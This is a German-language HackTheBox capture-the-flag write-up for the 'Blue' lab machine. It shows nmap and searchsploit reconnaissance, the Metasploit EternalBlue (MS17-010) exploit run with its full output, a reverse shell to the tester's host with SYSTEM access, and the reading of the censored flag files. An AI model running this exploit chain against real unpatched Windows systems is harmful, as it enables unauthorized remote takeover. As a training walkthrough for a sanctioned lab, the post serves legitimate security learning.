---
title: "HackTheBox - Blue WriteUp | Tipps + Anleitung"
date: 2018-01-13T20:00:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[Blue](https://www.hackthebox.eu/home/machines/profile/51) ist eine der vielen Verfügbaren CTF Challenges von [HackTheBox](https://hackthebox.eu/). [Blue](https://www.hackthebox.eu/home/machines/profile/51) gehört zu den einfacheren Maschinen von [HackTheBox](https://hackthebox.eu/) und ist deswegen sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.

[![difficulty](https://imgur.com/J7Ulmet.jpg)](https://imgur.com/J7Ulmet)

## **Tipps**

- **nmap -A** zeigt uns deutlich auf welchen Port wir achten müssen
- Der Name der Maschine, **Blue**, ist ein Tipp
- Wenn wir wissen was die Schwachstelle ist, ist Metasploit unser Freund.
- Wenn der Exploit fehlschlagen sollte, überprüfe deine Einstellungen und versuche es noch ein paar Mal.  
Ansonsten kann auch ein Reset von **Blue** helfen.

## **Video**

[![kurzes video walkthrough](http://img.youtube.com/vi/qo2WI_vrIGA/0.jpg)](http://www.youtube.com/watch?v=qo2WI_vrIGA)

## **Anleitung / Walkthrough**

Als erstes machen wir wie gewohnt einen Nmap-Scan. Dabei benutzen wir die Option **-A** um das Betriebssystem und ebenfalls die Services herauszufinden, welche auf den jeweiligen Ports laufen.

```shell
root@kali:~# nmap -A 10.10.10.40

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-10 11:10 CET
Nmap scan report for 10.10.10.40
Host is up (0.14s latency).
Not shown: 991 closed ports
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49156/tcp open msrpc Microsoft Windows RPC
49157/tcp open msrpc Microsoft Windows RPC

[...]

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
| OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
| Computer name: haris-PC
| NetBIOS computer name: HARIS-PC\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2018-01-10T10:11:48+00:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2018-01-10 11:11:49
|_ start_date: 2018-01-10 09:45:10
```

Anscheinend ist das Betriebssystem Windows 7 mit dem Service Pack 7. Auf Port 445 scheint [SMB](https://de.wikipedia.org/wiki/Server_Message_Block) zu laufen.

Benutzen wir doch mal **searchsploit** um nach Schwachstellen für [SMB](https://de.wikipedia.org/wiki/Server_Message_Block) bei Windows 7 zu suchen.

```shell
root@kali:~# searchsploit windows 7 smb
------------------------------------------------------------------------------------------------
Exploit Title
------------------------------------------------------------------------------------------------
[...]
Microsoft Windows Windows 7/2008 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)
Microsoft Windows Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
Microsoft Windows Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)
[...]
------------------------------------------------------------------------------------------------
```

Diese 3 Zeilen klingen besonders interessant. **'EternalBlue' SMB Remote Code Execution (MS17-010)**.  
[EternalBlue](https://de.wikipedia.org/wiki/EternalBlue) scheint der richtige Weg zu sein.

Mal sehen ob Metasploit ein Modul für [EternalBlue](https://de.wikipedia.org/wiki/EternalBlue) hat.

```shell
msf > use exploit/windows/smb/
use exploit/windows/smb/generic_smb_dll_injection
use exploit/windows/smb/group_policy_startup
use exploit/windows/smb/ipass_pipe_exec
use exploit/windows/smb/ms03_049_netapi
use exploit/windows/smb/ms04_007_killbill
use exploit/windows/smb/ms04_011_lsass
use exploit/windows/smb/ms04_031_netdde
use exploit/windows/smb/ms05_039_pnp
use exploit/windows/smb/ms06_025_rasmans_reg
use exploit/windows/smb/ms06_025_rras
use exploit/windows/smb/ms06_040_netapi
use exploit/windows/smb/ms06_066_nwapi
use exploit/windows/smb/ms06_066_nwwks
use exploit/windows/smb/ms06_070_wkssvc
use exploit/windows/smb/ms07_029_msdns_zonename
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
use exploit/windows/smb/ms10_046_shortcut_icon_dllloader
use exploit/windows/smb/ms10_061_spoolss
use exploit/windows/smb/ms15_020_shortcut_icon_dllloader
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/netidentity_xtierrpcpipe
use exploit/windows/smb/psexec
```

Tatsächlich! **use exploit/windows/smb/ms17_010_eternalblue** Das macht es für uns einfach!

Laden wir das Modul und sehen uns die Optionen an.

```shell
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

Name  Current Setting Required Description
----  --------------- -------- -----------
[...]
RHOST                          The target address
RPORT 445                      The target port (TCP)
[...]
```

Der Port ist schon richtig eingestellt. Deswegen müssen wir nur noch **RHOST** auf die IP-Adresse von Blue setzen und mit dem Befehl **exploit** starten.

```shell
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
RHOST => 10.10.10.40

msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.254:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 2 opened (10.10.14.254:4444 -> 10.10.10.40:49158) at 2018-01-10 11:19:14 +0100
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Es hat funktioniert! Falls es bei dir nicht funktioniert, überprüfe nochmal ob **RHOST** und **RPORT** richtig eingestellt ist.  
Wenn es trotzdem nach mehreren Versuchen nicht funktioniert, hilft es **Blue** zurückzusetzen.

Sehen wir uns zuerst einmal mit dem Befehl **whoami** an, als welcher Benutzer wir Zugriff haben.

```shell
C:\Windows\system32>whoami
whoami
nt authority\system
```

Dank des Metasploit Modules sind wir schon direkt als **nt authority\system** angemeldet. Jetzt müssen wir nur noch die beiden Text-Dateien **user.txt** und **root.txt** finden.

```shell
C:\Windows\system32>cd C:/Users
cd C:/Users

C:\Users>dir
dir
Volume in drive C has no label.
Volume Serial Number is A0EF-1911

Directory of C:\Users

21/07/2017 06:56 <DIR> .
21/07/2017 06:56 <DIR> ..
21/07/2017 06:56 <DIR> Administrator
14/07/2017 13:45 <DIR> haris
12/04/2011 07:51 <DIR> Public
0 File(s) 0 bytes
5 Dir(s) 15,501,770,752 bytes free

C:\Users>cd haris
cd haris

C:\Users\haris>cd ..
cd ..

C:\Users>cd haris/Desktop
cd haris/Desktop

C:\Users\haris\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is A0EF-1911

Directory of C:\Users\haris\Desktop

24/12/2017 02:23 <DIR> .
24/12/2017 02:23 <DIR> ..
21/07/2017 06:54 32 user.txt
1 File(s) 32 bytes
2 Dir(s) 15,509,401,600 bytes free
```

Unter **C:\Users\haris\Desktop\\** befindet sich die **user.txt** Datei mit dem Befehl **type** können wir unter Windows den Inhalt ausgeben lassen.

```shell
C:\Users\haris\Desktop>type user.txt
type user.txt
##########zensiert###########ea9
```

Jetzt ist die **root.txt** Datei dran

```shell
C:\Users\haris\Desktop>cd C:/Users/Administrator/Desktop
cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is A0EF-1911

Directory of C:\Users\Administrator\Desktop

24/12/2017 02:22 <DIR> .
24/12/2017 02:22 <DIR> ..
21/07/2017 06:57 32 root.txt
1 File(s) 32 bytes
2 Dir(s) 15,500,283,904 bytes free
```

Diese befindet sich unter **C:\Users\Administrator\Desktop\\**. Jetzt nur noch wieder mit **type** den Inhalt ausgeben...

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
##########zensiert###########717
```

Und wir haben User und Root auf Blue erfolgreich geownt!